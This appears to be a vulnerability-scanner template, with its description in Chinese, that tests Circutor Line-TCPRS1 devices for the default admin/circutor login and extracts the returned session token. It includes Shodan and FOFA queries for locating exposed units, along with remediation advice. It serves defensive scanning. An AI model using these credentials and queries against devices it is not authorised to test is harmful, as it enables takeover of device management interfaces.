id: circutor-default-login

info:
  name: Circutor Line-TCPRS1 默认口令登录（弱口令）
  author: s4e-io
  severity: high
  description: |
    该模板用于检测 Circutor Line-TCPRS1 是否仍可使用默认凭据或弱口令登录。模板主要向 `/api/v1/login` 等认证入口发送请求，使用内置默认凭据组合进行认证尝试，并根据响应中的 `application/json` 等登录成功特征判断登录是否成功；命中说明目标未及时修改出厂、示例或初始化账号口令。
  impact: |
    - 攻击者可接管 Circutor Line-TCPRS1 的 Web 管理界面，查看设备状态、网络配置、运行日志或敏感业务参数。
    - 被接管的网络、工控、打印、语音、存储或远程管理设备可能被用于中断业务、改变路由/访问策略、窃取流量或作为内网横向移动入口。
  remediation: |
    - 立即修改所有默认账号口令，禁用不再使用的出厂账号，并为管理账户设置高强度唯一密码。
    - 将设备管理入口限制在 VPN、堡垒机或可信管理网段内，避免直接暴露到公网。
    - 升级设备固件或管理组件，审计近期登录记录、配置变更和异常会话。
  reference:
    - https://circutor.com/en/products/line-tcprs1/
  metadata:
    verified: true
    max-request: 1
    vendor: circutor
    product: line-tcprs1
    shodan-query: http.html:"Line-TCPRS1"
    fofa-query: body="Line-TCPRS1"
  tags: circutor,iot,tcprs1,default-login,vuln

http:
  - raw:
      - |
        POST /api/v1/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json;charset=UTF-8

        {"Username":"{{username}}","Password":"{{password}}"}

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - circutor

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - '"Token"\s*:\s*"eyJ[a-zA-Z0-9]{10,}\.eyJ[a-zA-Z0-9]{10,}\.[a-zA-Z0-9_\-]{10,}"'

      - type: word
        part: header
        words:
          - 'application/json'

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: body
        name: token
        group: 1
        regex:
          - '"Token"\s*:\s*"(eyJ[a-zA-Z0-9]{10,}\.eyJ[a-zA-Z0-9]{10,}\.[a-zA-Z0-9_\-]{10,})"'
